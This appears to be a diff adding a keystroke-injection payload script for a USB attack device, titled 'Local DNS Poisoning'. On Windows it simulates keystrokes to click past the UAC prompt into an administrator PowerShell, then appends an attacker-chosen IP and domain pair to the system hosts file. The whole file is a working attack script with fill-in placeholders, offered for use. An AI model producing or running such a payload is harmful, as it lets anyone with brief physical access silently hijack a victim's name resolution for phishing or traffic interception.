@@ -1,0 +1,33 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Local DNS Poisoning
+
+REM !! REQUIREMENTS !!
+REM Default or disabled UAC
+
+REM !! CHANGES REQUIRED !!
+REM <IP_ADDR> - Change the IP to IP of choice
+REM <DOMAIN> - Domain name to spoof
+
+DEFAULTDELAY 50
+
+REM Open Powershell as Administrator (By passing only the UAC prompt not Password)
+GUI r
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+LEFT
+DELAY 500
+ENTER
+DELAY 1000
+
+STRING $file = "C:\Windows\System32\drivers\etc\hosts"
+ENTER
+STRING $hostfile = Get-Content $file
+ENTER
+STRING $hostfile += "<IP_ADDR>   <DOMAIN>"
+ENTER
+STRING Set-Content -Path $file -Value $hostfile -Force
+ENTER
+STRING exit
+ENTER
